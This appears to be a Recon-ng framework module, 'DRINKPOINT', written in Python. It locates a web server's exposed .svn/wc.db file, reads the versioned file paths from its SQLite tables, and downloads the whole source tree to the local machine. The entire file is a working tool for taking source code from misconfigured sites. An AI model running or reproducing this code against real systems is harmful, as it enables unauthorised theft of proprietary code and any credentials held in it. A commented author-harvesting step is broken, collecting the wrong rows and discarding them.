from recon.core.module import BaseModule
import sqlite3
import os

class Module(BaseModule):

    meta = {
    'name':'DRINKPOINT',
    'author':'gwaffles (https://twitter.com/gwaffles_)',
    'description':'Exfiltrates a .svn paths source code from a specified url.',
    'options':(
            ('url', None, True, 'Url to exfiltrate .svn source code from.'),
            ('name', None, True, 'Project name of the .svn source.')
        )
    }

    def module_run(self):
        url     = self.fix_svn_url(self.options['url'])

        project = self.options['name']
        project_path_domain = url.replace('http://', '')
        project_path = os.path.join(os.path.expanduser('~/'), project_path_domain)

        if os.path.exists(project_path) is False:
            os.mkdir(project_path)

        svnfolder = os.path.join(project_path, project)

        if not url.endswith('.svn/'):
            wcdb = url + '.svn' + '/wc.db'

        data = self._request_data(wcdb)

        if not data:
            self.error('%s is not accessible at this time.' % url)
            return

        elif data:

            if os.path.exists(svnfolder):
                self.error('This source code has been exfiltrated before.')
                return

            elif not os.path.exists(svnfolder):
                os.mkdir(svnfolder)

            self.output('exfiltrating the \'%s\' svn source code.' % project)
            self.wcdb_method(url, svnfolder)
            self.output('exfiltration complete.')

    def fix_svn_url(self, url):
        url = url.replace('https://', '')
        url = url.replace('http://', '')
        url = 'http://' + url
        url = url.replace('.svn/', '')
        return url

    def _request_data(self, url):
        '''request content if available then return it.'''
        request = self.request(url)
        if request.status_code == 400 or request.status_code == 404 or request.status_code == 500:
            return None
        return request.raw

    def wcdb_method(self, url, path):
        '''Pertains to the tradecraft of parsing and collecting wc.db file entries.'''

        if '.svn/' in url:
            wcdb = url + 'wc.db'

        elif '.svn/' not in url:
            wcdb = url + '.svn/' + 'wc.db'

        # is the wc.db file avialable ?
        r_wcdb = self._request_data(wcdb)

        if r_wcdb is not None:

            if not os.path.exists(path):
                os.makedirs(path)

            if path.endswith('/'):
                filepath = path + 'wc.db'

            elif not path.endswith('/'):
                filepath = path + '/' + 'wc.db'

            with open(filepath, 'wb') as wcdb_path:
                wcdb_path.write(r_wcdb)
                wcdb_path.close()

            entries = self.read_wcdb(filepath)
            url = url.replace('.svn/', '')
            self.download_wcdb_entries(url=url, array=entries, path=path)

        elif r_wcdb is None:
            self.output('Falling back to another method.')

    def read_wcdb(self, path):
        '''Reads the wc.db file, to extract its file entries.'''

        connection = sqlite3.connect(path)
        session = connection.cursor()
        try:
            session.execute('select local_relpath, ".svn/pristine/" || substr(checksum,7,2) || "/" || substr(checksum,7) || ".svn-base" as alpha from NODES where kind="file";')
            entry_items = session.fetchall()
            # below functionality will find all usernames who have commited atleast once.
            session.execute('select distinct changed_author from nodes;')
            author_list = [r[0] for r in entry_items]
            session.close()
        except:
            return None
        return entry_items

    def download_wcdb_entries(self, url, array, path):
        '''Download the requested file to the exfiltrated data directory.'''

        for filename, url_path in array:
            src_url_path = url + url_path

            target_dir = os.path.join(path, os.path.dirname(filename))

            if target_dir and not os.path.exists(target_dir):
                os.makedirs(target_dir)

            data = self._request_data(src_url_path)

            if data:
                with open(os.path.join(path, filename), 'wb') as f:
                    f.write(data)

            elif not data:
                pass
